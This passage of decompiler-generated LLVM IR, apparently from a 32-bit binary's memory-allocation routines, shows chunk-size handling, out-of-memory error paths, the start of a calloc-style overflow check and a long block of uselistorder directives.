dec_label_pc_80523aa:                             ; preds = %dec_label_pc_8052395
  %v2_80523aa = add i32 %v1_8052399, %v1_80522f8
  store i32 %v0_80522e5, i32* %ecx.global-to-local, align 4
  %v1_80523b1 = or i32 %v2_80523aa, 1
  store i32 %v1_80523b1, i32* %eax.global-to-local, align 4
  store i32 %v1_80523b1, i32* %v2_80522ee, align 4
  br label %dec_label_pc_80524e9

dec_label_pc_80523bc:                             ; preds = %dec_label_pc_8052395
  %v7_80523a1 = icmp ult i32 %v0_8052461100, %v2_805239f
  %v0_80523bc = load i8, i8* @global_var_8055c20.49, align 1
  %v1_80523bc = sext i8 %v0_80523bc to i32
  store i32 %v1_80523bc, i32* %eax.global-to-local, align 4
  %v2_80523c1 = urem i8 %v0_80523bc, 2
  %v3_80523c1 = icmp eq i8 %v2_80523c1, 0
  %brmerge = or i1 %v2_80522f8, %v3_80523c1
  %v1_80523cb = icmp eq i1 %v7_80523a1, false
  %or.cond97 = or i1 %v1_80523cb, %brmerge
  br i1 %or.cond97, label %dec_label_pc_80523d5, label %dec_label_pc_80523cd

dec_label_pc_80523cd:                             ; preds = %dec_label_pc_80523bc
  %v1_80523cd = and i32 %v1_80523bc, -2
  %v4_80523cd = trunc i32 %v1_80523cd to i8
  store i32 %v1_80523cd, i32* %eax.global-to-local, align 4
  store i8 %v4_80523cd, i8* @global_var_8055c20.49, align 32
  br label %dec_label_pc_80523d5

dec_label_pc_80523d5:                             ; preds = %dec_label_pc_80523bc, %dec_label_pc_80523cd
  %v0_80523d5 = phi i8 [ %v0_80523bc, %dec_label_pc_80523bc ], [ %v4_80523cd, %dec_label_pc_80523cd ]
  %v1_80523d5 = urem i8 %v0_80523d5, 2
  %v2_80523d5 = icmp eq i8 %v1_80523d5, 0
  br i1 %v2_80523d5, label %dec_label_pc_8052453, label %dec_label_pc_80523de

dec_label_pc_80523de:                             ; preds = %dec_label_pc_80523d5
  br i1 %v2_80522f8, label %dec_label_pc_80523ec, label %dec_label_pc_80523e2

dec_label_pc_80523e2:                             ; preds = %dec_label_pc_80523de
  store i32 %v2_80523a1, i32* %eax.global-to-local, align 4
  %v2_80523e6 = add i32 %v2_8052399, %v2_80523a1
  store i32 %v2_80523e6, i32* @global_var_8055c28.46, align 8
  br label %dec_label_pc_80523ec

dec_label_pc_80523ec:                             ; preds = %dec_label_pc_80523de, %dec_label_pc_80523e2
  %v1_80523ee = urem i32 %v0_8052461100, 8
  %v2_80523ee = icmp eq i32 %v1_80523ee, 0
  store i32 %v1_80523ee, i32* %edx.global-to-local, align 4
  %v1_80523f1 = icmp eq i1 %v2_80523ee, false
  br i1 %v1_80523f1, label %dec_label_pc_80523f9, label %dec_label_pc_80523f3

dec_label_pc_80523f3:                             ; preds = %dec_label_pc_80523ec
  store i32 %v0_8052461100, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052403

dec_label_pc_80523f9:                             ; preds = %dec_label_pc_80523ec
  %v2_80523fe = sub nsw i32 8, %v1_80523ee
  store i32 %v2_80523fe, i32* %eax.global-to-local, align 4
  %v2_8052400 = add i32 %v2_80523fe, %v0_8052461100
  store i32 %v2_8052400, i32* @edi, align 4
  br label %dec_label_pc_8052403

dec_label_pc_8052403:                             ; preds = %dec_label_pc_80523f3, %dec_label_pc_80523f9
  %v0_8052406 = phi i32 [ 0, %dec_label_pc_80523f3 ], [ %v2_80523fe, %dec_label_pc_80523f9 ]
  %v2_8052403 = add i32 %v1_8052399, %v0_8052461100
  %v2_8052406 = add i32 %v0_8052406, %v1_80522f8
  store i32 %v2_8052406, i32* %ecx.global-to-local, align 4
  %v2_805240f = add i32 %v2_8052406, %v2_8052403
  store i32 %v2_805240f, i32* %edx.global-to-local, align 4
  %v2_8052415 = add i32 %v2_805240f, %v1_8052218
  %v5_8052418 = and i32 %v2_8052415, %v1_8052314
  %v2_805241f = sub i32 %v5_8052418, %v2_805240f
  store i32 %v2_805241f, i32* %eax.global-to-local, align 4
  %v2_8052421 = add i32 %v2_805241f, %v2_8052406
  store i32 %v2_8052421, i32* @esi, align 4
  store i32 %v2_8052421, i32* %stack_var_-92, align 4
  %v1_8052425 = call i32 @function_8053b41(i32 %v2_8052421)
  store i32 %v1_8052425, i32* %eax.global-to-local, align 4
  store i32 %v1_8052425, i32* @edx, align 4
  %v10_805242f = icmp eq i32 %v1_8052425, -1
  %v1_8052432 = icmp eq i1 %v10_805242f, false
  br i1 %v1_8052432, label %dec_label_pc_8052442, label %dec_label_pc_8052434

dec_label_pc_8052434:                             ; preds = %dec_label_pc_8052403
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8052439 = call i32 @function_8053b41(i32 0)
  store i32 %v1_8052439, i32* %eax.global-to-local, align 4
  store i32 %v1_8052439, i32* @edx, align 4
  br label %dec_label_pc_8052476

dec_label_pc_8052442:                             ; preds = %dec_label_pc_8052403
  %v1_8052442 = load i32, i32* @ebx, align 4
  %v7_8052442 = icmp ult i32 %v1_8052425, %v1_8052442
  %v1_8052444 = icmp eq i1 %v7_8052442, false
  br i1 %v1_8052444, label %dec_label_pc_805247b, label %dec_label_pc_8052446

dec_label_pc_8052446:                             ; preds = %dec_label_pc_8052442
  %v0_8052446 = load i8, i8* @global_var_8055c20.49, align 1
  %v2_8052446 = and i8 %v0_8052446, -2
  store i8 %v2_8052446, i8* @global_var_8055c20.49, align 32
  store i32 %v2_8052403, i32* @edx, align 4
  br label %dec_label_pc_805245a

dec_label_pc_8052453:                             ; preds = %dec_label_pc_80523d5
  store i32 %v0_8052461100, i32* @edi, align 4
  br i1 %v10_80523a5, label %dec_label_pc_805245e, label %dec_label_pc_805245a

dec_label_pc_805245a:                             ; preds = %dec_label_pc_8052453, %dec_label_pc_8052446
  %v0_805247b58 = phi i32 [ %v2_8052403, %dec_label_pc_8052446 ], [ %v0_805245399, %dec_label_pc_8052453 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805247b

dec_label_pc_805245e:                             ; preds = %dec_label_pc_8052453
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8052465 = call i32 @function_8053b41(i32 0)
  store i32 %v1_8052465, i32* @edx, align 4
  %v1_805246c = load i32, i32* @ebx, align 4
  %v2_805246c = sub i32 %v1_8052465, %v1_805246c
  %v1_805246e = load i32, i32* @esi, align 4
  %v2_805246e = sub i32 %v2_805246c, %v1_805246e
  store i32 %v2_805246e, i32* %eax.global-to-local, align 4
  %v0_8052470 = load i32, i32* @global_var_8055c28.46, align 8
  %v2_8052470 = add i32 %v0_8052470, %v2_805246e
  store i32 %v2_8052470, i32* @global_var_8055c28.46, align 8
  br label %dec_label_pc_8052476

dec_label_pc_8052476:                             ; preds = %dec_label_pc_8052434, %dec_label_pc_805245e
  %v0_805247b57 = phi i32 [ %v1_8052439, %dec_label_pc_8052434 ], [ %v1_8052465, %dec_label_pc_805245e ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805247b

dec_label_pc_805247b:                             ; preds = %dec_label_pc_8052442, %dec_label_pc_805245a, %dec_label_pc_8052476
  %v0_8052480 = phi i32 [ %v1_8052425, %dec_label_pc_8052442 ], [ %v0_805247b58, %dec_label_pc_805245a ], [ %v0_805247b57, %dec_label_pc_8052476 ]
  %v10_805247b = icmp eq i32 %v0_8052480, -1
  br i1 %v10_805247b, label %dec_label_pc_80524e9, label %dec_label_pc_8052480

dec_label_pc_8052480:                             ; preds = %dec_label_pc_805247b
  %v1_8052480 = load i32, i32* @edi, align 4
  %v2_8052480 = sub i32 %v0_8052480, %v1_8052480
  store i32 %v2_8052480, i32* @edx, align 4
  store i32 %v1_8052480, i32* @global_var_80558ec.34, align 4
  %v1_8052488 = load i32, i32* @esi, align 4
  %v2_8052488 = add i32 %v1_8052488, %v2_8052480
  %v1_805248b = or i32 %v2_8052488, 1
  store i32 %v1_805248b, i32* %eax.global-to-local, align 4
  %v2_805248e = add i32 %v1_8052480, 4
  %v3_805248e = inttoptr i32 %v2_805248e to i32*
  store i32 %v1_805248b, i32* %v3_805248e, align 4
  %v0_8052491 = load i32, i32* @global_var_8055c28.46, align 8
  %v1_8052491 = load i32, i32* @esi, align 4
  %v2_8052491 = add i32 %v1_8052491, %v0_8052491
  store i32 %v2_8052491, i32* @global_var_8055c28.46, align 8
  br i1 %v2_80522f8, label %dec_label_pc_80524e9, label %dec_label_pc_805249b

dec_label_pc_805249b:                             ; preds = %dec_label_pc_8052480
  %v1_805249b = add i32 %v1_80522f8, -12
  store i32 %v0_80522e5, i32* %ecx.global-to-local, align 4
  %v1_80524a2 = and i32 %v1_805249b, -8
  store i32 %v1_80524a2, i32* %eax.global-to-local, align 4
  %v1_80524a7 = or i32 %v1_80524a2, 1
  store i32 %v1_80524a7, i32* @edx, align 4
  %v5_80524aa = icmp ult i32 %v1_80524a2, 15
  store i32 %v1_80524a7, i32* %v2_80522ee, align 4
  %v0_80524b0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80524b0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80524b0 = add i32 %v0_80524b0, 4
  %v3_80524b0 = add i32 %v2_80524b0, %v1_80524b0
  %v4_80524b0 = inttoptr i32 %v3_80524b0 to i32*
  store i32 5, i32* %v4_80524b0, align 4
  %v0_80524b8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80524b8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80524b8 = add i32 %v0_80524b8, 8
  %v3_80524b8 = add i32 %v2_80524b8, %v1_80524b8
  %v4_80524b8 = inttoptr i32 %v3_80524b8 to i32*
  store i32 5, i32* %v4_80524b8, align 4
  br i1 %v5_80524aa, label %dec_label_pc_80524e9, label %dec_label_pc_80524c2

dec_label_pc_80524c2:                             ; preds = %dec_label_pc_805249b
  %v0_80524c5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80524c7 = add i32 %v0_80524c5, 8
  store i32 %v1_80524c7, i32* %eax.global-to-local, align 4
  %v0_80524ca = load i32, i32* @global_var_8055c04.50, align 4
  store i32 %v0_80524ca, i32* @ebx, align 4
  store i32 %v1_80524c7, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8055c04.50, align 4
  %v1_80524db = call i32 @function_8052c13(i32 %v1_80524c7)
  store i32 %v1_80524db, i32* %eax.global-to-local, align 4
  %v0_80524e0 = load i32, i32* @ebx, align 4
  store i32 %v0_80524e0, i32* @global_var_8055c04.50, align 4
  br label %dec_label_pc_80524e9

dec_label_pc_80524e9:                             ; preds = %dec_label_pc_805249b, %dec_label_pc_8052480, %dec_label_pc_805247b, %dec_label_pc_80523aa, %dec_label_pc_80524c2
  %v0_80524e9 = load i32, i32* @global_var_8055c28.46, align 8
  store i32 %v0_80524e9, i32* %eax.global-to-local, align 4
  %v1_80524ee = load i32, i32* @global_var_8055c2c.51, align 4
  %tmp133 = icmp ugt i32 %v0_80524e9, %v1_80524ee
  br i1 %tmp133, label %dec_label_pc_80524f6, label %dec_label_pc_80524fb

dec_label_pc_80524f6:                             ; preds = %dec_label_pc_80524e9
  store i32 %v0_80524e9, i32* @global_var_8055c2c.51, align 4
  br label %dec_label_pc_80524fb

dec_label_pc_80524fb:                             ; preds = %dec_label_pc_80524e9, %dec_label_pc_80524f6
  %v1_80524fb = load i32, i32* @global_var_8055c24.44, align 4
  %v2_80524fb = add i32 %v1_80524fb, %v0_80524e9
  store i32 %v2_80524fb, i32* %eax.global-to-local, align 4
  %v1_8052501 = load i32, i32* @global_var_8055c34.47, align 4
  %tmp134 = icmp ugt i32 %v2_80524fb, %v1_8052501
  br i1 %tmp134, label %dec_label_pc_8052509, label %dec_label_pc_805250e

dec_label_pc_8052509:                             ; preds = %dec_label_pc_80524fb
  store i32 %v2_80524fb, i32* @global_var_8055c34.47, align 4
  br label %dec_label_pc_805250e

dec_label_pc_805250e:                             ; preds = %dec_label_pc_80524fb, %dec_label_pc_8052509
  %v0_805250e = load i32, i32* @global_var_80558ec.34, align 4
  store i32 %v0_805250e, i32* @ebx, align 4
  %v1_8052514 = add i32 %v0_805250e, 4
  %v2_8052514 = inttoptr i32 %v1_8052514 to i32*
  %v3_8052514 = load i32, i32* %v2_8052514, align 4
  %v1_8052517 = and i32 %v3_8052514, -4
  store i32 %v1_8052517, i32* %ecx.global-to-local, align 4
  %v10_805251a = icmp ult i32 %v1_8052517, %v1_80521b7
  br i1 %v10_805251a, label %dec_label_pc_805259a, label %dec_label_pc_8052520

dec_label_pc_8052520:                             ; preds = %dec_label_pc_805250e
  store i32 %.v1_8051ea3, i32* %esi.global-to-local, align 4
  %v2_8052526 = sub i32 %v1_8052517, %.v1_8051ea3
  store i32 %v2_8052526, i32* %ecx.global-to-local, align 4
  %v2_8052528 = add i32 %v0_805250e, %.v1_8051ea3
  store i32 %v2_8052528, i32* @edx, align 4
  %v1_805252b = or i32 %.v1_8051ea3, 1
  store i32 %v1_805252b, i32* %eax.global-to-local, align 4
  store i32 %v2_8052528, i32* @global_var_80558ec.34, align 4
  store i32 %v1_805252b, i32* %v2_8052514, align 4
  %v0_8052537.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052537

dec_label_pc_8052537:                             ; preds = %dec_label_pc_80521c8, %dec_label_pc_8052520
  %v0_8052537 = phi i32 [ %v5_80521db, %dec_label_pc_80521c8 ], [ %v0_8052537.pre, %dec_label_pc_8052520 ]
  %v1_8052537 = or i32 %v0_8052537, 1
  store i32 %v1_8052537, i32* %ecx.global-to-local, align 4
  %v0_805253a = load i32, i32* @ebx, align 4
  %v1_805253a = add i32 %v0_805253a, 8
  store i32 %v1_805253a, i32* %ebx.global-to-local, align 4
  %v1_805253d = load i32, i32* @edx, align 4
  %v2_805253d = add i32 %v1_805253d, 4
  %v3_805253d = inttoptr i32 %v2_805253d to i32*
  store i32 %v1_8052537, i32* %v3_805253d, align 4
  br label %dec_label_pc_80525a7

dec_label_pc_8052542:                             ; preds = %dec_label_pc_8051f82
  %v5_8052548 = sub i32 %v1_8051f65, %.v1_8051ea3
  store i32 %v5_8052548, i32* %eax.global-to-local, align 4
  %v2_805254c = add i32 %v1_8052559, %.v1_8051ea3
  store i32 %v2_805254c, i32* @edx, align 4
  %v1_8052550 = or i32 %.v1_8051ea3, 1
  store i32 %v2_805254c, i32* @global_var_80558f0.35, align 16
  store i32 %v1_8052550, i32* %v2_8051f5f, align 4
  %v0_805255c = load i32, i32* %eax.global-to-local, align 4
  %v0_805255e = load i32, i32* @edx, align 4
  store i32 %v0_805255e, i32* @global_var_80558fc.52, align 4
  %v1_8052564 = or i32 %v0_805255c, 1
  store i32 %v1_8052564, i32* %ecx.global-to-local, align 4
  store i32 %v0_805255e, i32* @global_var_8055900.37, align 256
  %v1_805256d = add i32 %v0_805255e, 8
  %v2_805256d = inttoptr i32 %v1_805256d to i32*
  store i32 ptrtoint (i32* @global_var_80558f4.36 to i32), i32* %v2_805256d, align 4
  %v0_8052574 = load i32, i32* @edx, align 4
  %v1_8052574 = add i32 %v0_8052574, 12
  %v2_8052574 = inttoptr i32 %v1_8052574 to i32*
  store i32 ptrtoint (i32* @global_var_80558f4.36 to i32), i32* %v2_8052574, align 4
  %v0_805257b = load i32, i32* %ecx.global-to-local, align 4
  %v1_805257b = load i32, i32* @edx, align 4
  %v2_805257b = add i32 %v1_805257b, 4
  %v3_805257b = inttoptr i32 %v2_805257b to i32*
  store i32 %v0_805257b, i32* %v3_805257b, align 4
  %v0_805257e = load i32, i32* %eax.global-to-local, align 4
  %v1_805257e = load i32, i32* @edx, align 4
  %v3_805257e = add i32 %v1_805257e, %v0_805257e
  %v4_805257e = inttoptr i32 %v3_805257e to i32*
  store i32 %v0_805257e, i32* %v4_805257e, align 4
  br label %dec_label_pc_805258c

dec_label_pc_8052583:                             ; preds = %dec_label_pc_8051f91
  store i32 %.v1_8051ea3, i32* %ebx.global-to-local, align 4
  %v0_8052587 = load i32, i32* @ebp, align 4
  %v2_8052587 = or i32 %.v1_8051ea3, 4
  %v3_8052587 = add i32 %v0_8052587, %v2_8052587
  %v4_8052587 = inttoptr i32 %v3_8052587 to i32*
  %v5_8052587 = load i32, i32* %v4_8052587, align 4
  %v6_8052587 = or i32 %v5_8052587, 1
  store i32 %v6_8052587, i32* %v4_8052587, align 4
  br label %dec_label_pc_805258c

dec_label_pc_805258c:                             ; preds = %dec_label_pc_8052542, %dec_label_pc_8052583
  %v0_805258c = load i32, i32* @ebp, align 4
  %v1_805258c = add i32 %v0_805258c, 8
  store i32 %v1_805258c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80525a7

dec_label_pc_8052591:                             ; preds = %dec_label_pc_8052081
  %v1_8052591 = load i32, i32* @ebx, align 4
  %v2_8052591 = add i32 %v0_8052090, 4
  %v3_8052591 = add i32 %v2_8052591, %v1_8052591
  %v4_8052591 = inttoptr i32 %v3_8052591 to i32*
  %v5_8052591 = load i32, i32* %v4_8052591, align 4
  %v6_8052591 = or i32 %v5_8052591, 1
  store i32 %v6_8052591, i32* %v4_8052591, align 4
  br label %dec_label_pc_8052596

dec_label_pc_8052596:                             ; preds = %dec_label_pc_8052099, %dec_label_pc_8052591
  %v0_8052596 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8052596, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80525a7

dec_label_pc_805259a:                             ; preds = %dec_label_pc_8052358, %dec_label_pc_805250e, %dec_label_pc_8052362
  %v0_805259a = load i32, i32* %stack_var_-92, align 4
  %v1_805259a = call i32 @function_8051a1b(i32 %v0_805259a)
  store i32 %v1_805259a, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80525a1 = inttoptr i32 %v1_805259a to i32*
  store i32 12, i32* %v1_80525a1, align 4
  br label %dec_label_pc_80525a7

dec_label_pc_80525a7:                             ; preds = %dec_label_pc_8052596, %dec_label_pc_805258c, %dec_label_pc_8052537, %dec_label_pc_80521f3, %dec_label_pc_80521a5, %dec_label_pc_8051f2c, %dec_label_pc_805259a
  store i32 %v2_8051e63, i32* @eax, align 4
  store i32 %v2_8051e63, i32* %stack_var_-92, align 4
  %v2_80525b0 = call i32 @function_805337a(i32 %v2_8051e63, i32 1)
  store i32 %v2_80525b0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80525b8

dec_label_pc_80525b8:                             ; preds = %dec_label_pc_8051e81, %dec_label_pc_80525a7
  %v0_80525bb = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80525bb, i32* %eax.global-to-local, align 4
  %v2_80525bd = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80525bd, i32* %ebx.global-to-local, align 4
  store i32 %v0_8051e50, i32* @esi, align 4
  store i32 %v0_8051e4f, i32* @edi, align 4
  store i32 %v0_8051e4e, i32* @ebp, align 4
  ret i32 %v0_80525bb

; uselistorder directives
  uselistorder i32 %v0_805257e, { 1, 0 }
  uselistorder i32 %v0_805255e, { 1, 0, 2 }
  uselistorder i32 %v2_80524fb, { 1, 0, 2 }
  uselistorder i32 %v0_80524e9, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8052480, { 1, 0 }
  uselistorder i32 %v2_805246e, { 1, 0 }
  uselistorder i32 %v1_8052425, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_805240f, { 1, 0, 2 }
  uselistorder i32 %v2_8052403, { 1, 2, 0 }
  uselistorder i32 %v2_80523fe, { 1, 0, 2 }
  uselistorder i32 %v1_80523ee, { 2, 1, 0 }
  uselistorder i8 %v0_80523bc, { 1, 0, 2 }
  uselistorder i1 %v10_80523a5, { 1, 0 }
  uselistorder i32 %v2_805239f, { 1, 0, 2 }
  uselistorder i32 %v0_8052461100, { 3, 1, 2, 4, 0, 6, 5 }
  uselistorder i32 %v1_8052399, { 2, 1, 0 }
  uselistorder i32 %v8_805236f, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_805236c, { 1, 0 }
  uselistorder i32 %v0_805234b, { 1, 0 }
  uselistorder i32 %v2_805231c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8052314, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8052301, { 1, 0 }
  uselistorder i1 %v2_80522f8, { 2, 1, 0 }
  uselistorder i32 %v1_80522f8, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v0_80522e5, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_80522c9, { 1, 0, 2 }
  uselistorder i32 %v2_80522b5, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_805227e, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8052272, { 2, 1, 0 }
  uselistorder i32 %v8_8052261, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_8052248, { 1, 0, 2 }
  uselistorder i32 %v0_80521e4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_80521b7, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80521ad, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_805219f, { 1, 0 }
  uselistorder i32 %v1_8052136, { 1, 0 }
  uselistorder i32 %v3_805212a, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_805213a, { 1, 0 }
  uselistorder i32 %v2_8052124, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_80521217, { 1, 0 }
  uselistorder i32 %v2_8052116, { 1, 0 }
  uselistorder i32 %v1_80520fa, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_80520f6, { 2, 1, 0 }
  uselistorder i32 %v1_80520f2, { 1, 0 }
  uselistorder i32 %v1_80520e6, { 2, 1, 0 }
  uselistorder i32 %v2_80520dc, { 1, 0 }
  uselistorder i32 %v1_80520d9, { 1, 2, 0 }
  uselistorder i32 %v4_8052077, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_80520c2, { 1, 0 }
  uselistorder i32 %v0_8052090, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8052063, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052030, { 0, 2, 1 }
  uselistorder i32 %v2_8052014, { 1, 0 }
  uselistorder i32 %v1_805200a, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8052005.lcssa, { 1, 0 }
  uselistorder i32 %v3_8051ff5, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8051fec, { 1, 0, 2 }
  uselistorder i32 %v2_8051fc8, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8051fb0, { 2, 1, 0 }
  uselistorder i32 %v0_8051f9c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8051f62, { 1, 0, 2 }
  uselistorder i32 %v1_8052559, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80520309, { 1, 0, 2 }
  uselistorder i32 %v3_8051f0f, { 1, 0, 2 }
  uselistorder i32 %v2_8051f01, { 2, 1, 0 }
  uselistorder i1 %v6_8051efb, { 1, 0, 2 }
  uselistorder i32 %v2_8051edc, { 2, 1, 0 }
  uselistorder i8 %v0_8051eaa, { 2, 1, 3, 0, 4 }
  uselistorder i32 %.v1_8051ea3, { 30, 12, 31, 2, 14, 32, 3, 21, 22, 33, 34, 4, 19, 20, 23, 25, 24, 5, 18, 17, 6, 16, 15, 28, 7, 27, 26, 35, 13, 29, 0, 11, 9, 10, 1, 8 }
  uselistorder i32 %v1_8051e93, { 0, 2, 1 }
  uselistorder i32 %v0_8051e7c, { 1, 0 }
  uselistorder i32 %v2_8051e63, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ecx.global-to-local, { 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 1, 21, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 0, 11, 13, 14, 15, 16, 17, 25, 18, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8055c20.49, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_8053690, { 1, 0 }
  uselistorder i32 134568180, { 1, 3, 0, 2 }
  uselistorder i32* @global_var_8055900.37, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_8051e28, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80558ec.34 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_80558ec.34 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_80525b8, { 1, 0 }
  uselistorder label %dec_label_pc_80525a7, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_805259a, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052596, { 1, 0 }
  uselistorder label %dec_label_pc_805258c, { 1, 0 }
  uselistorder label %dec_label_pc_8052537, { 1, 0 }
  uselistorder label %dec_label_pc_805250e, { 1, 0 }
  uselistorder label %dec_label_pc_80524fb, { 1, 0 }
  uselistorder label %dec_label_pc_80524e9, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805247b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052476, { 1, 0 }
  uselistorder label %dec_label_pc_8052403, { 1, 0 }
  uselistorder label %dec_label_pc_80523ec, { 1, 0 }
  uselistorder label %dec_label_pc_80523d5, { 1, 0 }
  uselistorder label %dec_label_pc_8052358, { 1, 0 }
  uselistorder label %dec_label_pc_805234b, { 1, 0 }
  uselistorder label %dec_label_pc_805230c, { 1, 0 }
  uselistorder label %dec_label_pc_80522e5, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80522c9, { 1, 0 }
  uselistorder label %dec_label_pc_80522b0, { 1, 0 }
  uselistorder label %dec_label_pc_8052292, { 1, 0 }
  uselistorder label %dec_label_pc_80521ad, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80521a5, { 1, 0 }
  uselistorder label %dec_label_pc_805218e, { 1, 0 }
  uselistorder label %dec_label_pc_8052121, { 1, 0 }
  uselistorder label %dec_label_pc_8052126.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80520fa, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052081, { 1, 0 }
  uselistorder label %dec_label_pc_8052030, { 1, 0 }
  uselistorder label %dec_label_pc_8052008, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8051ff1, { 1, 0 }
  uselistorder label %dec_label_pc_8051f5f, { 1, 0 }
  uselistorder label %dec_label_pc_8052030.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051f2c, { 1, 0, 3, 2 }
}

define i32 @function_80525c2(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80525c2:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_80525c2 = load i32, i32* @edi, align 4
  %v0_80525c4 = load i32, i32* @ebx, align 4
  %v12_80525c5 = ptrtoint i32* %stack_var_-28 to i32
  %v4_80525c8 = trunc i64 %arg1 to i32
  %sext = mul i64 %arg1, 4294967296
  %v2_80525d2 = sdiv i64 %sext, 4294967296
  %v3_80525d2 = sext i32 %arg2 to i64
  %v4_80525d2 = mul nsw i64 %v3_80525d2, %v2_80525d2
  %v5_80525d2 = trunc i64 %v4_80525d2 to i32
  store i32 %v5_80525d2, i32* @ebx, align 4
  %v2_80525d5 = icmp eq i32 %v4_80525c8, 0
  br i1 %v2_80525d5, label %dec_label_pc_80525f7, label %dec_label_pc_80525d9

dec_label_pc_80525d9:                             ; preds = %dec_label_pc_80525c2
  store i32 %v4_80525c8, i32* @edi, align 4
  %div = udiv i32 %v5_80525d2, %v4_80525c8
  store i32 %div, i32* %eax.global-to-local, align 4
  %v12_80525e1 = icmp eq i32 %div, %arg2
  br i1 %v12_80525e1, label %dec_label_pc_80525f7, label %dec_label_pc_80525e5

dec_label_pc_80525e5:                             ; preds = %dec_label_pc_80525d9
  %v1_80525e5 = call i32 @function_8051a1b(i32 %v0_80525c4)
  store i32 %v1_80525e5, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80525ec = inttoptr i32 %v1_80525e5 to i32*
  store i32 12, i32* %v1_80525ec, align 4
  br label %dec_label_pc_80526ad

dec_label_pc_80525f7:                             ; preds = %dec_label_pc_80525d9, %dec_label_pc_80525c2
  store i32 %v12_80525c5, i32* @eax, align 4
  %v2_8052607 = call i32 @function_805337a(i32 %v12_80525c5, i32 134558583)
  store i32 %v2_8052607, i32* %eax.global-to-local, align 4
  %v1_8052613 = call i32 @function_8053377(i32 ptrtoint (i32* @global_var_80555dc.32 to i32))
